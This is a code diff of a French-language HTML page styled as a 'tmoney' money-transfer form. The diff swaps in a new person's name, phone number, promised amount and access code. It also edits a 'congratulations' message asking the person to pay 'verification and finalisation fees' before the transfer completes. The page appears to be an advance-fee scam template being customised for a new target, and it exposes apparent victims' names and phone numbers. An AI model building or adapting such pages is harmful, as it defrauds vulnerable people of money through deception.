@@ -177,17 +177,17 @@
     <form id="tmoneyForm" onsubmit="return false;">
       <div class="form-group">
         <label for="name">Nom et Prénom</label>
-        <input type="text" id="name" value="SIVAMINYA PINHAS" disabled />
+        <input type="text" id="name" value="KAKULE MALONA KAPITULA" disabled />
       </div>
 
       <div class="form-group">
         <label for="phone">Numéro</label>
-        <input type="tel" id="phone" value="+243 097 646 8693" disabled />
+        <input type="tel" id="phone" value="+243 082 301 3420" disabled />
       </div>
 
       <div class="form-group">
         <label for="amount">Montant à recevoir</label>
-        <input type="text" id="amount" value="4 800 USD" disabled />
+        <input type="text" id="amount" value="728 USD" disabled />
       </div>
 
       <button class="btn" type="button" onclick="startProgress()">Procéder</button>
@@ -202,7 +202,7 @@
       </div>
 
       <div class="notification-message" id="notificationMessage">
-  Felicitation vous avez réussi : Nous vous prions de bien vouloir régler les frais de vérification et de finalisation, indispensables pour compléter le transfert. Le montant s’élève à 758.25 USD.
+  Felicitation vous avez réussi : Nous vous prions de bien vouloir régler les frais demandé.
       </div>
     </form>
   </div>
@@ -212,7 +212,7 @@
       const code = document.getElementById("accessCode").value;
       const error = document.getElementById("accessError");
 
-      if (code === "8693") {
+      if (code === "3420") {
         error.style.display = "none";
         document.getElementById("accessContainer").style.display = "none";
         document.getElementById("formContainer").style.display = "block";
